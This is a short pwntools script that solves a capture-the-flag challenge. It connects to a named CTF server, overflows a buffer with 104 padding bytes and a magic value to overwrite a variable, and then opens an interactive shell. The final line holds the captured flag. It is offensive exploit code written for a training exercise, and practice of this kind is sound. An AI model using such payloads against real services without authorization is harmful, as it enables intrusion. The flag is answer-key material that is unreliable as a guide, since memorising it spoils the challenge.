from pwn import *

# 1. Connection details
host = 'svtctf.m0lecon.it'
port = 13403

# 2. Establish connection
io = remote(host, port)

# 3. Construct the payload
# Padding: 0x70 - 0x08 = 104 bytes
# Magic value: 0xdeadbabebeefc0de
payload = b"A" * 104
payload += p64(0xdeadbabebeefc0de)

# 4. Interaction
# Wait for the prompt (e.g., "Give me some data:")
print(io.recvuntil(b" ").decode()) # Adjust based on what the program prints

# Send the payload to overwrite the target variable
io.sendline(payload)

# 5. Open the shell
# If successful, you can now type 'ls' or 'cat flag'
io.interactive()

#svt{ov3rwr1t3_the_fl0w_4HLfWjjZWLMKN71P}